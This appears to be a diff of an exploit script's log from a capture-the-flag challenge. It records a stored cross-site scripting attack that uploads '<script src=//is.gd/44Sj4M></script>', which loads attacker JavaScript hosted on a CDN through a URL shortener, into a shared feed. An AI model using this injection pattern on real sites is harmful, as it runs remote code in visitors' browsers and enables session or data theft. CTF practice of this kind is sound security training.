@@ -1,5 +1,10 @@
-GET comment -> 404 <h1>Not Found</h1>
-comment present: False
-GET settings -> 200 <!doctype html> <html lang="en"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, in
-bio set: False
-POST comment -> 303 present: True
+jsurl https://cdn.jsdelivr.net/gh/nuravavilckina2003-del/ctfcuppp@350b9e0760b123324756a70af41d5da01bef2961/x.js
+jsdelivr 200 application/javascript; charset=utf-8 895
+shortener is.gd 200 https://is.gd/44Sj4M
+short is.gd/44Sj4M
+payload <script src=//is.gd/44Sj4M></script> 36
+upload 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/241
+share 303
+CHANT 'A wild cheer erupts: <script src=//is.gd/44Sj4M></script>!'
+feed has box: True
+poll done, msgs 0
